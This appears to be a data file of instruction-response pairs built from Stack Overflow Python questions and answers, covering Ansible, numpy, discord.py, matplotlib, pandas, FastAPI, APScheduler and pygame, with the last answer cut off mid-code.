{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Enable Apache site using Ansible<p>I am running a playbook from a python script. I am following <a href=\"https:\/\/docs.ansible.com\/ansible\/latest\/dev_guide\/developing_api.html\" rel=\"nofollow noreferrer\">this code<\/a><\/p>\n\n<p>The following command works perfectly.<\/p>\n\n<pre><code>ansible -i path\/to\/inventory.yml host_name -m command -a\"a2ensite site_name\"\n<\/code><\/pre>\n\n<p>But when I try to do the same by executing a playbook from the python script. It says the site doesn't exist. Following is the playbook.<\/p>\n\n<pre><code>playbook = dict(\n        name = \"Enable Site\",\n        hosts = ['token_server'],\n        gather_facts = 'no',\n        tasks = [\n            dict(action=dict(module='command', args=\"a2ensite \" + site_name), register='shell_out'),\n            dict(action=dict(module='service', args=\"name='apache2' state='reloaded'\"), register='shell_out'),\n        ]\n    )\n<\/code><\/pre>\n\n<p>It gives the following error.<\/p>\n\n<blockquote>\n  <p>fatal: [token_server]: FAILED! => {\"ansible_facts\": {\"discovered_interpreter_python\": \"\/usr\/bin\/python\"}, \"changed\": true, \"cmd\": \"a2ensite token_server\", \"delta\": \"0:00:00.054682\", \"end\": \"2019-12-11 01:03:10.546478\", \"msg\": \"non-zero return code\", \"rc\": 1, \"start\": \"2019-12-11 01:03:10.491796\", \"stderr\": \"ERROR: Site token_server does not exist!\", \"stderr_lines\": [\"ERROR: Site token_server does not exist!\"], \"stdout\": \"\", \"stdout_lines\": []}<\/p>\n<\/blockquote>\n\n<p><strong>Update<\/strong>\nI tried running this playbook. This playbook shows the content of \"\/etc\/apache2\/sites-available\" directory.<\/p>\n\n<pre><code>playbook = dict(\n        name = \"Enable Site\",\n        hosts = ['token_server'],\n        gather_facts = 'yes',\n        tasks = [\n            dict(action=dict(module='shell', args='ls \/etc\/apache2\/sites-available'), register='shell_out'),\n        dict(action=dict(module='debug', args=dict(msg='{{shell_out.stdout}}')))\n        ]\n    )\n<\/code><\/pre>\n\n<p>It shows the contents of \/etc\/apache2\/sites-available directory on my local.\nIt means the command is actually being executed on my local, not on the remote server.<\/p>\n\n<p>Here is my \"hosts inventory file\".<\/p>\n\n<pre><code>all:\n  hosts:\n    policy_server:\n      ansible_host: 155.138.130.72\n      ansible_password: XXXXXXXXXX\n      ansible_ssh_common_args: -o StrictHostKeyChecking=no\n      ansible_user: root\n    token_server:\n      ansible_host: 155.138.150.239\n      ansible_password: XXXXXXXXXX\n      ansible_ssh_common_args: -o StrictHostKeyChecking=no\n      ansible_user: root\n<\/code><\/pre>","output_text":"<p>The most likely explanation is that you followed the example a little too closely.  The example provided by the docs has the following line:<\/p>\n\n<pre><code>context.CLIARGS = ImmutableDict(connection='local', \n    module_path=['\/to\/mymodules'], \n    forks=10, become=None, become_method=None, become_user=None, \n    check=False, diff=False)\n<\/code><\/pre>\n\n<p>That line contains <code>connection='local'<\/code> which instructs ansible to always connect to localhost regardless of the specified host.  Try removing that from your CLIARGS, and your connection should work.  Good luck!<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I find identical rows in different arrays regardless of element order using Numpy?<p>I was working on a project and stumbled upon this problem.\nI have two arrays A and B of shape (8,3) and (2,2). How can I find all the rows of A that contain elements of each row of B regardless of the order of the elements in B?<\/p>\n<pre><code>A = np.random.randint(0,5,(8,3))\nB = np.random.randint(0,5,(2,2))\n<\/code><\/pre>\n<p>Thanks!<\/p>","output_text":"<p>Here is a one way to do it:<\/p>\n<pre><code>Import numpy as np\n\nA = np.random.randint(0,5,(8,3))\nB = np.random.randint(0,5,(2,2))\n\nC = (A[..., np.newaxis, np.newaxis] == B)\nrows = np.where(C.any((3,1)).all(1))[0]\nprint(rows)\n<\/code><\/pre>\n<p><strong>Output:<\/strong><\/p>\n<pre><code>[0 2 3 4]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Distance between multiple vectors<p>I have two sets of three-dimensional unit-vectors that I would like to get a measure of how similar they are. My current method is to manually calculate the euclidean norm of their difference.<\/p>\n\n<p>An example (without considering unit-vectors) would look like<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import numpy as np\n\nN = 4000\na = np.random.rand(3,N)\nb = np.random.rand(3,N)\n\ndist = np.sum((a-b)**2,axis=0)\ndist = np.sum(dist)\/len(dist)\n<\/code><\/pre>\n\n<p>Are there better ways to do this; i.e. a numpy function or a measure I haven't thought of? <\/p>","output_text":"<p>To calculate Euclidean distance in numpy you can use <\/p>\n\n<pre><code>numpy.linalg.norm(a-b)\n<\/code><\/pre>\n\n<p>Also there are other types of distances, measuring other types of similarities. SciPy has a lot of them implemented and described in docs: <a href=\"https:\/\/docs.scipy.org\/doc\/scipy\/reference\/spatial.distance.html\" rel=\"nofollow noreferrer\">https:\/\/docs.scipy.org\/doc\/scipy\/reference\/spatial.distance.html<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Discord.py Bot Takes too Long to Respond<p><strong>Goal:<\/strong><\/p>\n<p>I'm developing a discord bot which scans a url every 5 seconds or so, checks for a <em>specified<\/em> change on that webpage, and will send a message in the discord channel if that change occurs. I've done this by sending the url to the bot using an if statement in <code>on_message<\/code>. The url is then passed to a <code>tasks.loop()<\/code> function, where it is scanned and processed in another function for the change.<\/p>\n<p><strong>Problem<\/strong>:<\/p>\n<p>I'd like to be able to send a message in the discord channel which quickly ends the process taking place in the  <code>tasks.loop()<\/code>, so that I can pass it a different url to scan using the <code>on_message<\/code> function. In its current form, it works-- just <em>very<\/em> slowly. From the time the cancel trigger is sent, it takes around 3 minutes to send the verification message that the process has been cancelled. I need to make this 5 seconds or less. For what its worth, the bot is kept running using <a href=\"https:\/\/replit.com\/\" rel=\"nofollow noreferrer\">replit<\/a> and <a href=\"https:\/\/uptimerobot.com\" rel=\"nofollow noreferrer\">uptime robot<\/a>, but I am sure that the long response time is not related to the frequency the repl is awoken by uptime robot.<\/p>\n<p><strong>Code:<\/strong><\/p>\n<p>My code is much more complex and riddled with obscurely named variables, so here is a much simpler snippet of code with the same general structure.<\/p>\n<pre><code>client = discord.Client()\nchannel = client.get_channel(CHANNEL_ID)\n\n@tasks.loop()\nasync def myloop(website, dataframe):\n    \n    channel = client.get_channel(CHANNEL_ID)\n    \n    try:\n        # iteratively scrape data from a website for\n        # a predefined change in the dataframe\n        if change = True:\n            await channel.send(notification)\n            \n    except:\n        pass\n\n\n@client.event\nasync def on_message(message):\n    \n    channel = client.get_channel(CHANNEL_ID)\n    msg = message.content\n    \n    if msg.startswith('track'):\n        \n        website = msg[6:]\n        await channel.send('Now tracking '+str(website))\n        myloop(website,df)\n\n    if msg.starswith('stop'):\n        \n        myloop.cancel()\n        await channel.send('Done tracking, awaiting orders.')\n\n        \n\n<\/code><\/pre>\n<p><strong>Attempted Solutions:<\/strong><\/p>\n<p>I have tried using some forms of threading, which I am very new to, and I haven't found a way to make it work any faster. Any suggestions or solutions would be greatly appreciated! I've been combing the web for help for quite some time now.<\/p>","output_text":"<p>Looks like you could use <code>client.loop.create_task<\/code> to create asyncio task objects, and their <code>cancel<\/code> method to immediately cancel those asyncio tasks at the right time, e.g.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import asyncio\nfrom replit import db\n\n\n_task = None\n\n\nasync def myloop():\n    website = db['website']\n    dataframe = db['dataframe']\n    channel = client.get_channel(CHANNEL_ID)\n\n    while not client.is_closed():\n        await asyncio.sleep(5)\n        try:\n            # iteratively scrape data from a website for\n            # a predefined change in the dataframe\n            if change:\n                await channel.send(notification)\n        except:\n            pass\n\n\n@client.event\nasync def on_message(message):\n    global _task  # This gives the function access to the variable that was already created above.\n    msg = message.content\n    \n    if msg.startswith('track'):\n        website = msg[6:]\n        await message.channel.send('Now tracking '+str(website))\n        db['website'] = website\n        db['dataframe'] = df\n        if _task is not None:\n            _task.cancel()\n        _task = client.loop.create_task(myloop())\n\n    if msg.startswith('stop'):\n        if _task is not None:\n            _task.cancel()\n            _task = None\n            await message.channel.send('Done tracking, awaiting orders.')\n\n<\/code><\/pre>\n<p>The argument <code>create_task<\/code> takes is a coroutine that takes no arguments, so the website URL and dataframe need to be accessible to the function a different way (I'm not sure which way you would prefer or would be best; using replit's db is just an example).<\/p>\n<p>With this approach, you should be able to use <code>track<\/code> again to change which website is being monitored without using <code>stop<\/code> in between.<\/p>\n<p>More details in the docs:<\/p>\n<ul>\n<li><a href=\"https:\/\/discordpy.readthedocs.io\/en\/latest\/api.html?highlight=client#discord.Client.loop\" rel=\"nofollow noreferrer\">discord.Client.loop<\/a><\/li>\n<li><a href=\"https:\/\/docs.python.org\/3\/library\/asyncio-eventloop.html#asyncio.loop.create_task\" rel=\"nofollow noreferrer\">loop.create_task<\/a><\/li>\n<li><a href=\"https:\/\/docs.python.org\/3\/library\/asyncio-task.html#asyncio.Task.cancel\" rel=\"nofollow noreferrer\">Task.cancel<\/a><\/li>\n<li><a href=\"https:\/\/docs.python.org\/3\/library\/asyncio-task.html#asyncio.sleep\" rel=\"nofollow noreferrer\">asyncio.sleep<\/a><\/li>\n<li><a href=\"https:\/\/discordpy.readthedocs.io\/en\/latest\/api.html?highlight=client#discord.Client.is_closed\" rel=\"nofollow noreferrer\">discord.Client.is_closed<\/a><\/li>\n<li><a href=\"https:\/\/docs.replit.com\/tutorials\/11-using-the-replit-database\" rel=\"nofollow noreferrer\">Replit db<\/a><\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Matplotlib pie chart: Show both value and percentage<p>Here's my current code<\/p>\n\n<pre><code>values = pd.Series([False, False, True, True])\nv_counts = values.value_counts()\nfig = plt.figure()\nplt.pie(v_counts, labels=v_counts.index, autopct='%.4f', shadow=True);\n<\/code><\/pre>\n\n<p>Currently, it shows only the percentage (using <code>autopct<\/code>)<\/p>\n\n<p>I'd like to present both the percentage and the actual value (I don't mind about the position)<\/p>\n\n<p>How to do it?<\/p>\n\n<p>Thanks<\/p>","output_text":"<p>Create your own formatting function. Note that you have to recalculate the actual value from the percentage in that function somehow<\/p>\n\n<pre><code>def my_fmt(x):\n    print(x)\n    return '{:.4f}%\\n({:.0f})'.format(x, total*x\/100)\n\n\nvalues = pd.Series([False, False, True, True, True, True])\nv_counts = values.value_counts()\ntotal = len(values)\nfig = plt.figure()\nplt.pie(v_counts, labels=v_counts.index, autopct=my_fmt, shadow=True);\n<\/code><\/pre>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/fTyHf.png\" rel=\"noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/fTyHf.png\" alt=\"enter image description here\"><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n WebScrapping - Python - Selenium + BeautifullSoup<p>I`m trying to build a web scrapper to get user profile information such as <code>name, location, experience, skills and languages<\/code><\/p>\n<p>The problem I'm facing is:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/XZED7.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/XZED7.png\" alt=\"Example profile\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/mJji4.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/mJji4.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>inside each <code>li<\/code> tag contains the text I'm looking for<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/6hYOB.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/6hYOB.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>When I look to get information on <code>Experience<\/code> the section id changes for each profile, and if I try to use a different <strong>tag, for example a div<\/strong> brings me information from other fields that I do not  need.\nOther thing, as you can see on the picture it shows 'div' id = 'experience', but as this tag do not nest any parent tag I cannot use it to extract the data.<\/p>","output_text":"<p>I would recommend doing: <code>soup.findAll('div')<\/code>\nfor finding all div's and then just split the output, so you can get the id that you want ;D<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python, pandas replace entire column with regex match of string<p>I'm using pandas to analyze data from 3 different sources, which are imported into dataframes and require modification to account for human error, as this data was all entered by humans and contains errors.<\/p>\n<p>Specifically, I'm working with street names. Until now, I have been using .str.replace() to remove street types (st., street, blvd., ave., etc.), as shown below. This isn't working well enough, and I decided I would like to use regex to match a pattern, and transform that entire column from the original street name, to the pattern matched by regex.<\/p>\n<pre><code>df['street'] = df['street'].str.replace(r' avenue+', '', regex=True)\n<\/code><\/pre>\n<p>I've decided I would like to use regex to identify (and remove all other characters from the address column's fields): any number of integers, followed by a space, and then the first 3 number of alphabetic characters.\nFor example, &quot;3762 pearl street&quot; might become &quot;3762 pea&quot; if x is 3 with the following regex:<\/p>\n<pre><code>(\\d+ )+\\w{0,3}\n<\/code><\/pre>\n<p>How can I use panda's .str.replace to do this? I don't want to specify WHAT I want to replace with  the second argument. I want to replace the original string with the pattern matched from regex.\nSomething that, in my mind, might work like this:<\/p>\n<pre><code>df['street'] = df['street'].str.replace(ORIGINAL STRING, r' (\\d+ )+\\w{0,3}, regex=True)\n<\/code><\/pre>\n<p>which might make 43 milford st. into &quot;43 mil&quot;.<\/p>\n<p>Thank you, please let me know if I'm being unclear.<\/p>","output_text":"<p>you could use the <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.Series.str.extract.html\" rel=\"nofollow noreferrer\">extract method<\/a> to overwrite the column with its own content<\/p>\n<pre><code>pat = r'(\\d+\\s[a-zA-Z]{3})'\ndf['street'] = df['street'].str.extract(pat) \n<\/code><\/pre>\n<p>Just an observation: The regex you shared <code>(\\d+ )+\\w{0,3}<\/code> matches the following patterns and returns some funky stuff as well<\/p>\n<ul>\n<li>1131 1313 street<\/li>\n<li>121 avenue<\/li>\n<li>1 1 1 1 1 1 avenue<\/li>\n<li>42<\/li>\n<\/ul>\n<p>I've changed it up a bit based on what you described, but i'm not sure if that works for all your datapoints.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n FastAPI accepting a POST with BasicAuth, Headers and Body?<p>So relatively new to <code>FastAPI<\/code>, and I have a small project I am trying to perform. Been through the examples at <a href=\"https:\/\/fastapi.tiangolo.com\/\" rel=\"nofollow noreferrer\">https:\/\/fastapi.tiangolo.com\/<\/a>. and did get some of what I am posting but not all.<\/p>\n<p>My Post is a JSON body, with a single header, but uses basic auth. If I use the <code>FastAPI<\/code> Basic <code>Auth<\/code> example, I can get the <code>user\/pass<\/code> easily. If I use Request, It gets the Header and Body easily, but accessing the user data coughs<\/p>\n<pre><code>    ), &quot;AuthenticationMiddleware must be installed to access request.user&quot;\nAssertionError: AuthenticationMiddleware must be installed to access request.user\n<\/code><\/pre>\n<p>So I can see it's there, but can't read it.<\/p>\n<pre><code>from typing import Union\nfrom fastapi import Depends, FastAPI, Header, Request, Body\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nsecurity = HTTPBasic()\napp = FastAPI()\n@app.post(&quot;\/posttest&quot;)\nasync def root(request: Request):\n        my_header = request.headers.get('client_id')\n        return{&quot;Client-Id&quot;: my_header, &quot;Body&quot;: await request.json(), &quot;User&quot;: request.user}\n<\/code><\/pre>\n<p>I am not sure how one collects all 3 bits so I can use my own python request code to do a proper <code>O-Auth2<\/code> call with this data to return the answer the original post needed (The App cannot do <code>O-Auth<\/code>, so I am making a wedge)<\/p>\n<p>This block instead will get the username and password, but I am unable to pull my Header or Body. I am sure I am missing something silly, but this is my first crack at this.<\/p>\n<pre><code>async def root(credentials: HTTPBasicCredentials = Depends(security)):\n        return {&quot;username&quot;: credentials.username, &quot;password&quot;: credentials.password}\n<\/code><\/pre>","output_text":"<p>Learned my solution by learning how to build on the attributes in my app's funtion. Thanks everyone!<\/p>\n<pre><code>def read_items(credentials: HTTPBasicCredentials = Depends(security), client_id: Union[str, None] = Header(default=None, convert_underscores=False), item: str = Body(embed=True)):\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Thread error while running scheduled task inside of a Flask application<p>I want to create a scheduler that will run every hour in my Flask application. To do this, I use the APScheduler library. Here is the most basic source code I could find online:<\/p>\n<pre><code>from apscheduler.scheduler import Scheduler\nimport atexit\n\ncron = Scheduler(daemon=True)\ncron.start()\n\n@cron.interval_schedule(minutes=1)\ndef job_function():\n    print(&quot;Hi&quot;)\n\natexit.register(lambda: cron.shutdown(wait=False))\n<\/code><\/pre>\n<p>When I try to run my application, I get the following error:<\/p>\n<pre><code>Traceback (most recent call last):\n  File &quot;\/home\/dimitar\/Desktop\/dev\/Tradiebot\/local\/WorxManager\/backend\/Server\/app.py&quot;, line 31, in &lt;module&gt;\n    def job_function():\n  File &quot;\/usr\/lib\/python3.9\/site-packages\/apscheduler\/scheduler.py&quot;, line 405, in inner\n    func.job = self.add_interval_job(func, **options)\n  File &quot;\/usr\/lib\/python3.9\/site-packages\/apscheduler\/scheduler.py&quot;, line 347, in add_interval_job\n    return self.add_job(trigger, func, args, kwargs, **options)\n  File &quot;\/usr\/lib\/python3.9\/site-packages\/apscheduler\/scheduler.py&quot;, line 285, in add_job\n    if not self.running:\n  File &quot;\/usr\/lib\/python3.9\/site-packages\/apscheduler\/scheduler.py&quot;, line 148, in running\n    thread_alive = self._thread and self._thread.isAlive()\nAttributeError: 'Thread' object has no attribute 'isAlive'\n<\/code><\/pre>\n<p>After a bit of research, I found that other people on python 3.9 have experienced a similar issue, but I found no solution to the problem.<\/p>\n<p>I do not want to downgrade my python version in fear that it will effect other libraries I am using as some of them are new and not developed to run on older versions of python.<\/p>\n<p>Is there a  workaround or an alternative library I can use to schedule a task to run in specified time intervals on a flask application?<\/p>","output_text":"<p>That code looks like it belongs to APScheduler 2.x which has not been updated in 7 years. Upgrade and the problem goes away.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I modify my for loop so that it extracts the correct data<pre><code>thread_list = ['DWr','Idle','MulWr','Lock']\nTarget_list = ['0','0','0','1']\ntrd_coor = [26,10,51,10,226,10,251,10]\nmem_coor = [10,215,35,215,60,215,85,215]\ntarg_1 = ['write','unchachable']\ncount_T = 0\ncount_X1 = 0\ncount_Y1 = 0\ncount_target = 0\ncount_target_1 = 0\ncount_dash_T = 0\nT = []\ntrd_Y1 = []\ncount_dash_T_list = [0,1,2,3]\nfor i in trd_coor[1::2]:\n    Y1 = i\n    trd_Y1.append(Y1)\nfor i in range(0,len(count_dash_T_list)):\n    target = Target_list[count_target]\n    count_target += 1\n    print(target)\n    for i in targ_1:\n        if (target == '0'):\n            if (i == 'write'):\n                X2 = mem_coor[0]\n                Y2 = mem_coor[1]\n        elif (target == '1'):\n            if (i == 'uncachable'):\n                X2 = mem_coor[2]\n                Y2 = mem_coor[3]\n            else:\n                break\n                    \n    print(X2)\n    print(Y2)\n<\/code><\/pre>\n<p>When the element in target_list is 1 I want the output to be 35,215 this is my current output:\n0\n10\n215\n0\n10\n215\n0\n10\n215\n1\n10\n215<\/p>\n<p>and this is the output I want:\n0\n10\n215\n0\n10\n215\n0\n10\n215\n1\n35\n215<\/p>","output_text":"<p>So there is two problems<\/p>\n<ol>\n<li>\n<ul>\n<li>typo with word <code>unchachable<\/code><\/li>\n<\/ul>\n<\/li>\n<li>\n<ul>\n<li><code>else<\/code> statement with <code>break<\/code><\/li>\n<\/ul>\n<\/li>\n<\/ol>\n<p>If you see closely then when we go into last <code>for<\/code><\/p>\n<pre><code> for i in targ_1:\n        if (target == '0'):\n            if (i == 'write'):\n                X2 = mem_coor[0]\n                Y2 = mem_coor[1]\n        elif (target == '1'):\n            if (i == 'uncachable'):\n                X2 = mem_coor[2]\n                Y2 = mem_coor[3]\n            else:\n                break\n<\/code><\/pre>\n<p>there <code>target<\/code> value is <code>1<\/code> so we go to <code>elif<\/code> and check <code>if<\/code> statemen. But <code>i<\/code>  is <code>write<\/code> so we go to <code>else<\/code> and then <code>break<\/code>.<\/p>\n<p>If You change type and remove break, then it should work<\/p>\n<pre><code>thread_list = ['DWr','Idle','MulWr','Lock']\nTarget_list = ['0','0','0','1']\ntrd_coor = [26,10,51,10,226,10,251,10]\nmem_coor = [10,215,35,215,60,215,85,215]\ntarg_1 = ['write','unchachable']\ncount_T = 0\ncount_X1 = 0\ncount_Y1 = 0\ncount_target = 0\ncount_target_1 = 0\ncount_dash_T = 0\nT = []\ntrd_Y1 = []\ncount_dash_T_list = [0,1,2,3]\n\nfor i in trd_coor[1::2]:\n    Y1 = i\n    trd_Y1.append(Y1)\nfor i in range(0,len(count_dash_T_list)):\n    target = Target_list[count_target]\n    count_target += 1\n    print(target)\n    for i in targ_1:\n        if (target == '0'):\n            if (i == 'write'):\n                X2 = mem_coor[0]\n                Y2 = mem_coor[1]\n        elif (target == '1'):\n            if (i == 'unchachable'):\n                X2 = mem_coor[2]\n                Y2 = mem_coor[3]\n    print(X2)\n    print(Y2)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Sorting train_test_split data by numpy array<p>I want to split the following numpy arrays for training and testing: <code>X<\/code>, <code>y<\/code> and <code>qid<\/code><\/p>\n<ul>\n<li><code>X<\/code> is a set of featurized documents - <strong>shape<\/strong>: (140, 105)<\/li>\n<li><code>qid<\/code> is a set of query identifiers for each document - <strong>shape<\/strong>: (140,)<\/li>\n<li><code>y<\/code> is a set of labels for each (<code>X<\/code>, <code>qid<\/code>) pair - <strong>shape<\/strong>: (140,)<\/li>\n<\/ul>\n<p>At the moment, what I do for splitting is:<\/p>\n<pre><code># Split documents, labels, and query_ids into training (70%) and testing (30%)\n    X_tr, X_tst, y_tr, y_tst, qid_tr, qid_tst= train_test_split(X, y, qid, test_size=0.3, random_state=1, shuffle=True, stratify=qid)\n<\/code><\/pre>\n<p>The problem is that after splitting, I need the returning numpy arrays to be sorted by <code>qid<\/code>. That is, all the documents with the <strong>same<\/strong> <code>qid<\/code> need to be together (one after another) as a block (both in training and testing).<\/p>\n<p><strong>Example<\/strong><\/p>\n<p>Correct split:<\/p>\n<pre><code>X              qid           y       \n------------------------------\ndocument 1     0             0\ndocument 5     0             1\ndocument 4     1             1\ndocument 6     1             0\ndocument 9     2             1\n<\/code><\/pre>\n<p>Incorrect split:<\/p>\n<pre><code>X              qid           y       \n------------------------------\ndocument 1     0             0\ndocument 4     1             1\ndocument 9     2             1\ndocument 5     0             1\ndocument 6     1             0\n<\/code><\/pre>\n<p>Is there any way to make this possible?<\/p>","output_text":"<p>There is a very simple way to split data into training and test set. While splitting you want to maintain two things:<\/p>\n<ol>\n<li>Your data is shuffled properly, Usually, we have data set in some order and we want to shuffle properly to get better results,<\/li>\n<li>You must get the same set of rows in train and test split each time.<\/li>\n<\/ol>\n<p>For that, you can simply create a df by joining all your X and qid and y dfs. and then use pandas to shuffle and split into train and test set.<\/p>\n<pre><code>import pandas as pd \n\n# Shuffle your dataset \nshuffle_df = df.sample(frac=1)\n\n# Define a size for your train set \ntrain_size = int(0.7 * len(df))\n\n# Split your dataset \ntrain_set = shuffle_df[:train_size]\ntest_set = shuffle_df[train_size:]\n<\/code><\/pre>\n<p>Now you can sort the training set based on qid column and split it into multiple dfs to obtain X_train, y_train and qid_train. Do same thing for test set.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n image showing until mouse button is up in pygame?<p>when I click on the image it is supposed to show me an image on top of it and the image stays until the mouse button is up so i put <code>if event.type == pygame.MOUSEBUTTONUP:<\/code> then <code>blit<\/code> the image but still it stays for a second after the mouse button is up im sure its because of my if statement here is my code:<\/p>\n<p>where my problem is:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for i in range(4):\n    pygame.draw.rect(screen, (colors[i]), (17 + 80 * i, 265, 50, 50))\n    pygame.draw.rect(screen, (0,0,0), (17 + 80 * i, 265, 50, 50),5)\n    if mouse_x &gt; mouse_pos_x_left[i] and mouse_x &lt; mouse_pos_x_right[i]:\n        if mouse_y &gt; 5.4 and mouse_y &lt; 6.26:\n            pygame.draw.rect(screen, (255,255,255), (17 + 80 * i, 265, 50, 50), 5)\n            if event.type == pygame.MOUSEBUTTONDOWN:\n                food_selected = foods[i]\n                screen.blit(check, (17 + 80 * i, 210, 50, 50))  \n            if event.type == pygame.MOUSEBUTTONUP:\n                screen.blit(check, (17 + 80 * i, 210, 50, 50))\n            if click == 3:\n                click = 0\n<\/code><\/pre>\n<p>all my code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import pygame\nimport pdb\nimport random as r\npygame.init()\nscreen = pygame.display.set_mode((325,325))\nrunning = True\ncolors = [(199,203,132), (255,0,0), (0,255,0), (84,87,44)]\nmouse_pos_x_left = [0.4, 1.98, 3.62, 5.22]\nmouse_pos_x_right = [1.26, 2.86, 4.46, 6.06]\nfoods = ['bread', 'tomato', 'lettuce', 'ham']\nfood_selected = ''\ncustomer1 = pygame.image.load('customer1.png')\nfood_box = pygame.image.load('food_box.png')\ncheck = pygame.image.load('check.png')\nsame = False\n#rand\nrandom_num_1 = r.randint(1,4)\nrandom_num_2 = r.randint(1,4)\nrandoms = [1,2,3,4]\nfood_1 = ''\nfood_2 = ''\nclick = 0\nable = False\n&quot;&quot;&quot;Bugs:\n- when selected same food as customer and clicked on other food it removes checkmark\n- when clicked on food shows checkmark for a sec\n- when selected same food as customer and then chose another same food as customer first checkmark removes \n&quot;&quot;&quot;\n\nwhile running:\n    same_foods = False\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n        screen.fill((255,255,255))\n        pos = pygame.mouse.get_pos()\n        mouse_x = pos[0] \/ 50\n        mouse_y = pos[1] \/ 50\n        mouse = pygame.mouse.get_pos()\n        #draw foods:\n        for i in range(4):\n            pygame.draw.rect(screen, (colors[i]), (17 + 80 * i, 265, 50, 50))\n            pygame.draw.rect(screen, (0,0,0), (17 + 80 * i, 265, 50, 50),5)\n            if mouse_x &gt; mouse_pos_x_left[i] and mouse_x &lt; mouse_pos_x_right[i]:\n                if mouse_y &gt; 5.4 and mouse_y &lt; 6.26:\n                    pygame.draw.rect(screen, (255,255,255), (17 + 80 * i, 265, 50, 50), 5)\n                    if event.type == pygame.MOUSEBUTTONDOWN:\n                        food_selected = foods[i]\n                        screen.blit(check, (17 + 80 * i, 210, 50, 50))  \n                    if event.type == pygame.MOUSEBUTTONUP:\n                        screen.blit(check, (17 + 80 * i, 210, 50, 50))\n            if click == 3:\n                    click = 0   \n        #customer:\n        customer1_img = pygame.transform.scale(customer1, (150,150))\n        food_box_img = pygame.transform.scale(food_box, (100, 125))\n        screen.blit(customer1_img, (50,50))\n        screen.blit(food_box_img, (170,0))\n        #random food:\n        for i in range(4):\n            #if random number is == 1 \n            if random_num_1 == randoms[i]:\n                #then food_1 == to the first food\n                food_1 = foods[i]\n                #then draw the first food \n                pygame.draw.rect(screen, (colors[i]), (195, 5, 50, 50))\n            if random_num_2 == randoms[i]:\n                food_2 = foods[i]\n                pygame.draw.rect(screen, (colors[i]), (195, 60, 50, 50))\n            if food_1 == food_2:\n                same_foods = True\n                if click == 1:\n                    img = pygame.transform.scale(check, (30,30))\n                    screen.blit(img, (285, 10))\n                if click == 2:\n                    screen.blit(img, (285, 70))\n            if same_foods == False:\n                if food_selected == food_1:\n                    same = True\n                    img = pygame.transform.scale(check, (30,30))\n                    screen.blit(img, (285, 10))\n                else:\n                    same = False\n                if food_selected == food_2:\n                    same = True\n                    img = pygame.transform.scale(check, (30,30))\n                    screen.blit(img, (285, 70))\n                else:\n                    same = False\n                if same:\n                    click = 0\n            pass\n\n    pygame.display.flip()\npygame.quit()\n<\/code><\/pre>","output_text":"<p>I recommend using <a href=\"https:\/\/www.pygame.org\/docs\/ref\/rect.html\" rel=\"nofollow noreferrer\"><code>pygame.Rect.collidepoint<\/code><\/a> for the mouse click detection. See <a href=\"https:\/\/stackoverflow.com\/questions\/10990137\/pygame-mouse-clicking-detection\/64533684#64533684\">Pygame mouse clicking detection<\/a><\/p>\n<hr \/>\n<p>Add a list that indicates if a button is clicked:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>clicked = [False, False, False, False]\n<\/code><\/pre>\n<p>Toggle the state of the button saved in the list when the mouse button is clicked:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>if event.type == pygame.MOUSEBUTTONDOWN:\n    for i in range(4):\n        if pygame.Rect(17 + 80 * i, 265, 50, 50).collidepoint(event.pos):\n            clicked[i] = not clicked[i]\n<\/code><\/pre>\n<p>Do not draw the scene in the event loop. Draw the scene in the application loop, depending on the variables that indicate the state of the game.<br \/>\nDo not scale the images in the application loop. Scale the images once before the loop. Scaling the images every frame is a waste of performance and causes the game to lag:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># [...]\n\ncustomer1_img = pygame.transform.scale(customer1, (150,150))\nfood_box_img = pygame.transform.scale(food_box, (100, 125))\ncheck_img = pygame.transform.scale(check, (30,30))\n\nclicked = [False, False, False, False]\n\n# application 